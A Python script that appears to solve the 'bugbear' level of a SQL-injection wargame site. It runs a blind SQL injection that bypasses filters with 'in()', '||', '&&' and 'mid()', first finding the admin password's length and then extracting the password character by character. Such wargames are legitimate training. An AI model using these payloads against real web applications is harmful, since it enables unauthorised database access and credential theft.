import requests
import urllib.parse
import string

cookies={'PHPSESSID': ''}

hello_admin="Hello admin"
length_pass=0
for x in range(10):
    url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no="+ urllib.parse.quote("1   ||  length(pw)  in({})#".format(x))
    print(url)
    res = requests.get(url,cookies=cookies)
    #print(res.text)
    if hello_admin in res.text:
        print("Password Lenght is "+str(x))
        length_pass=x
print(length_pass)







pwd = ''


for i in range(1, length_pass+1):
    for j in range(48, 122):
        url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=" +urllib.parse.quote("1   ||  id  in(\"admin\")   &&  ")+ urllib.parse.quote("mid(pw,{},1)    in(\"{}\")#".format(str(i),chr(j))) #substring(pw,1,1)=0
        print(url)
        req = requests.get(url, cookies=cookies)
        #print(pwd)
        if "Hello admin" in req.text:
            print(pwd)
            pwd += chr(j)
            break

print(pwd)
